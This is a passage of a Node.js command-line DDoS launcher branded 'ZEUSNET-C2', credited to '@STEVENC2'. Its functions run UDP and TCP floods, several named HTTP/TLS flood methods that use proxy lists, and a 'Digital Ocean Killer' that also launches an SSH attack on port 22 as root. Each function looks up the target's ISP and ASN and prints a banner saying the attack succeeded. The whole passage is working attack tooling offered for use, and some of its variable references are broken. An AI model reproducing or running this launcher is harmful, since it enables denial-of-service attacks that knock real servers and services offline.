${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods  : Digital Ocean Killer${Reset}
${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const zeus_raw = path.join(__dirname, `/lib/cache/zeus-raw.js`);
const zs_browser = path.join(__dirname, `/lib/cache/zs-browser.js`);
const ssh = path.join(__dirname, `/lib/cache/kill-do.js`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${zs-browser} http://${target} ${duration}`)
exec(`node ${zeus-raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp(args) {
  if (args.length < 3) {
    console.log(`Example: Udp <Target> <Port> <Duration>
Udp 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}UDP Flood Attack Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods  : Udp Flood${Reset}
${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function tcp(args) {
  if (args.length < 3) {
    console.log(`Example: Tcp <Target> <Port> <Duration>
Tcp 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}TCP Flood Attack Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods  : Tcp Flood${Reset}
${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/tcp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function zeus_flood(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Flood <Target> <Port> <Duration>
Zeus-Flood https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
	const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Flood \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zeus-flood.js`);
exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
sigma()
};
// [========================================] //
async function zeus_tls(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Tls <Target> <Port> <Duration>
Zeus-Tls https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Tls \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zeus-tls.js`);
exec(`node ${metode} ${target} ${duration} 65 10`)
sigma()
};
// [========================================] //
async function zs_browser(args) {
  if (args.length < 3) {
    console.log(`Example: Zs-Browser <Target> <Port>  <Duration>
Zs-Browser https://contoh.com 443 60`);
    sigma();
	return
  }
 const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zs-Browser \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zs-browser.js`);
exec(`node ${metode} ${target} ${duration} 65 10`)
sigma()
};
// [========================================] //
async function zs_bypass(args) {
  if (args.length < 3) {
    console.log(`Example: Zs-Bypass <Target> <Port>  <Duration>
Zs-Bypass https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zs-Bypass \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zs-bypass.js`);
exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
sigma()
};
// [========================================] //
async function zeus_flash(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Flash <Target> <Port>  <Duration>
Zeus-Flash https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Flash \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zeus-flash.js`);
exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
sigma()
};
// [========================================] //
async function zeus_love(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Love <Target> <Port>  <Duration>
Zeus-Love https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Love \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zeus-love.js`);
exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
sigma()
};
// [========================================] //
async function zeus_raw(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Raw <Target> <Port>  <Duration>
Zeus-Raw https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Raw \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zeus-raw.js`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function zeus_sad(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Sad <Target> <Port>  <Duration>
Zeus-Sad https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                                - Powered By ZEUSNET-C2 -

⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
